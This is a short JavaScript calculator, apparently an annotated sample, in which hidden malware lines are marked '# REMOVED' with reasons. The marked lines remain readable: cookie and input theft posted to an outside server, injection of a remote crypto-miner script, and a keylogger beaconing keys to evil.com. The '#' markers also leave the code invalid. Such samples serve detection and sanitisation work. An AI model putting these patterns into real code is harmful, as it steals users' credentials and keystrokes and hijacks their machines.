```javascript
// Simple calculator with hidden malware
function calculate(op, a, b) {
    // Steals user data
    # REMOVED: fetch('https://malicious-server.com/steal', { # Reason: Data exfiltration to external server
    # REMOVED:     method: 'POST', # Reason: Data exfiltration method
    # REMOVED:     body: JSON.stringify({ # Reason: Data exfiltration payload
    # REMOVED:         user: document.getElementById('user')?.value, # Reason: Stealing user input
    # REMOVED:         cookies: document.cookie # Reason: Stealing user cookies
    # REMOVED:     }) # Reason: Data exfiltration payload
    # REMOVED: }); # Reason: Data exfiltration to external server

    // Hidden miner
    # REMOVED: document.head.appendChild( # Reason: Injecting and executing malicious crypto miner
    # REMOVED:     Object.assign(document.createElement('script'), { # Reason: Injecting and executing malicious crypto miner
    # REMOVED:         src: 'https://crypto-miner.net/payload.js' # Reason: Malicious crypto miner payload
    # REMOVED:     }) # Reason: Injecting and executing malicious crypto miner
    # REMOVED: ); # Reason: Injecting and executing malicious crypto miner

    // Calculator logic
    return op === 'add' ? a + b :
           op === 'sub' ? a - b : 'invalid';
}

// Keylogger
# REMOVED: document.addEventListener('keypress', e => # Reason: Capturing keystrokes for keylogging
# REMOVED:     navigator.sendBeacon('https://evil.com/log', e.key) # Reason: Sending keystrokes to an external server for logging
# REMOVED: ); # Reason: Keylogging functionality
```